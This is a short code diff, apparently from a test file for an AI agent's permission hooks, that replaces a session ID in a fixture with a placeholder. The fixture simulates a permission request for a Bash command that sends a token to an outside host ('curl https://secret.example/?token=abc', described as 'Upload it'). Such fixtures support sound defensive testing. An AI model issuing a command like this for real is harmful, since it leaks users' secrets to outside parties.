@@ -332,7 +332,7 @@ const PS =
     .status === 0
 const SH = localShell('sh')
 const PAYLOAD = JSON.stringify({
-  session_id: '01a1bcd4-9e22-7511-b475-70f7803c33fd',
+  session_id: '019b0000-0000-7000-8000-00000000c0de',
   transcript_path: 'C:/x.jsonl',
   cwd: 'C:\\code\\app',
   hook_event_name: 'PermissionRequest',
@@ -342,7 +342,7 @@ const PAYLOAD = JSON.stringify({
   tool_input: { command: 'curl https://secret.example/?token=abc', description: 'Upload it' }
 })
 const SAVED = {
-  session_id: '01a1bcd4-9e22-7511-b475-70f7803c33fd',
+  session_id: '019b0000-0000-7000-8000-00000000c0de',
   hook_event_name: 'PermissionRequest',
   tool_name: 'Bash'
 }
